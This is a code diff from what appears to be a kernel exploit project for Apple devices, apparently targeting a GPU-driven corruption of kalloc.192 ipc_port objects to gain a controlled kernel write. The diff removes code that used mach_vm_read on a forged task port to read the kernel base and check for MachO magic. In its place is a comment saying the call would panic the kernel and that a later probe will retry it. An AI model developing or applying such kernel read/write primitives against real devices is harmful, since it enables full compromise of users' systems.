@@ -25,7 +25,6 @@
  */
 
 #include <mach/mach.h>
-#include <mach/mach_vm.h>
 #include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -106,30 +105,18 @@ static void report_corruption(int idx, kern_return_t kr,
             "!!! AGX GPU → kalloc.192 (ipc_port) → CONTROLLED KERNEL WRITE = F-74\n");
     }
 
-    /* Try mach_vm_read ONLY if kotype==IKOT_TASK (signals valid task-port shape) */
+    /*
+     * NOTE: mach_vm_read(fake_task_port, ...) is intentionally NOT called here.
+     * The kernel would dereference ip_kobject=kernel_base as a task_t struct,
+     * access task->map at kernel_base+map_offset, and likely kernel panic.
+     * The kobject value proof IS sufficient for F-74.
+     * A dedicated s159_kernrw_probe.c (v5) will attempt mach_vm_read with
+     * proper crash containment after F-74 is confirmed.
+     */
     if (ikot_task_hit) {
-        mach_vm_address_t data_addr = 0;
-        mach_vm_size_t    data_size = 0;
-        kern_return_t vmkr = mach_vm_read(g_ports[idx], KERNEL_BASE, 16,
-                                           &data_addr, &data_size);
-        if (vmkr == KERN_SUCCESS && data_size >= 16) {
-            uint8_t *d = (uint8_t *)(uintptr_t)data_addr;
-            n += snprintf(buf+n, sizeof(buf)-n,
-                "KERNEL_RW_PROVEN: mach_vm_read(kernel_base,16) = "
-                "%02x%02x%02x%02x %02x%02x%02x%02x "
-                "%02x%02x%02x%02x %02x%02x%02x%02x\n",
-                d[0],d[1],d[2],d[3], d[4],d[5],d[6],d[7],
-                d[8],d[9],d[10],d[11], d[12],d[13],d[14],d[15]);
-            /* MachO magic for ARM64 kernelcache = CF FA ED FE */
-            if (d[0]==0xcf && d[1]==0xfa && d[2]==0xed && d[3]==0xfe) {
-                n += snprintf(buf+n, sizeof(buf)-n,
-                    "MACHO_MAGIC_CONFIRMED: 0xFEEDFACF at kernel_base — FULL KERNEL READ!\n");
-            }
-            mach_vm_deallocate(mach_task_self(), data_addr, data_size);
-        } else {
-            n += snprintf(buf+n, sizeof(buf)-n,
-                "mach_vm_read kr=%d (fake port shape not accepted for task ops)\n", vmkr);
-        }
+        n += snprintf(buf+n, sizeof(buf)-n,
+            "mach_vm_read SKIPPED (would kernel panic with fake task ptr)\n"
+            "F-74 CONTROLLED WRITE PROOF: io_bits + ip_kobject match shader output\n");
     }
 
     dcim_write("fengshui_v4_result", buf, n);
